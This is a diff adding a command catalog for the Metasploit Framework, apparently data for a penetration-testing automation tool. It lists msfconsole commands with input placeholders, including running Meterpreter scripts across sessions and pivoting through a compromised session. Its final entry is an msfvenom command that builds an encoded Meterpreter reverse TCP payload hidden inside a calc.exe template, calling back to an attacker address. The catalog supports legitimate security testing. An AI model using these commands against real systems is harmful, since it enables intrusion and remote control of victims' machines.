@@ -1,0 +1,134 @@
+---
+name: Metasploit Framework
+description: A penetration testing platform for finding, validating, and exploiting vulnerabilities
+os: Linux
+ptf_module: modules/exploitation/metasploit
+---
+commands:
+  - "Load Resource File":
+    - type: ["bash","interactive"]
+    - text: "msfconsole -r {FILE}"
+    - input: [".rc resource file"]
+    - output: ["STDOUT",{"PROMPT":"msfconsole"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Display Exploits":
+    - type: ["msfconsole","interactive"]
+    - text: "show exploits"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"msfconsole"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Display Auxiliary Modules":
+    - type: ["msfconsole","interactive"]
+    - text: "show auxiliary"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"msfconsole"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Display Payloads":
+    - type: ["msfconsole","interactive"]
+    - text: "show payloads"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"msfconsole"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Search by String":
+    - type: ["msfconsole","interactive"]
+    - text: "search {STR}"
+    - input: ["search string"]
+    - output: ["STDOUT",{"PROMPT":"msfconsole"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Show Module Information":
+    - type: ["msfconsole","interactive"]
+    - text: "info {STR}"
+    - input: ["module name"]
+    - output: ["STDOUT",{"PROMPT":"msfconsole"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Load Module or Exploit":
+    - type: ["msfconsole","interactive"]
+    - text: "use {STR}"
+    - input: ["module or exploit name"]
+    - output: ["STDOUT",{"PROMPT":"msfconsole"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Display Module Options":
+    - type: ["msfconsole","interactive"]
+    - text: "show options"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"msfconsole"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Display Advanced Module Options":
+    - type: ["msfconsole","interactive"]
+    - text: "show advanced"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"msfconsole"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Set an Option's Value":
+    - type: ["msfconsole","interactive"]
+    - text: "set {STR} {STR}"
+    - input: ["option name","value"]
+    - output: ["STDOUT",{"PROMPT":"msfconsole"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "List Sessions, verbose":
+    - type: ["msfconsole","interactive"]
+    - text: "sessions -v"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"msfconsole"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Run Meterpreter Script on All Sessions":
+    - type: ["msfconsole","interactive"]
+    - text: "sessions -s {STR}"
+    - input: ["Meterpreter script name"]
+    - output: ["STDOUT",{"PROMPT":"msfconsole"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "List All Jobs":
+    - type: ["msfconsole","interactive"]
+    - text: "jobs -l"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"msfconsole"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Run Exploit as a Job":
+    - type: ["msfconsole","interactive"]
+    - text: "exploit -j"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"msfconsole"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Pivot Through a Session":
+    - type: ["msfconsole","interactive"]
+    - text: "route add {IPV4} {IPV4} {STR}"
+    - input: ["remote IPv4 address","remote network netmask","target session ID"]
+    - output: ["STDOUT",{"PROMPT":"msfconsole"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Load 3rd Party Tree":
+    - type: ["msfconsole","interactive"]
+    - text: "loadpath {FULLPATH}"
+    - input: ["modules folder path"]
+    - output: ["STDOUT",{"PROMPT":"msfconsole"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "SSL Connect (NC clone)":
+    - type: ["msfconsole","interactive"]
+    - text: "connect -s {IPV4} {INT}"
+    - input: ["target IPv4 address","target SSL port"]
+    - output: ["STDOUT",{"PROMPT":"msfconsole"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Create Encoded Meterpreter Reverse TCP Payload, EXE Format":
+    - type: ["bash","autonomous"]
+    - text: "msfvenom --payload windows/meterpreter/reverse_tcp --format exe --template calc.exe -k --encoder x86/shikata_ga_nai -i 5 LHOST={IPV4} LPORT={INT} > {FILE}"
+    - input: ["attacker IPv4 address","listening attacker TCP port number","output file"]
+    - output: ["STDOUT",{"FILE":{"input":3}}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+...
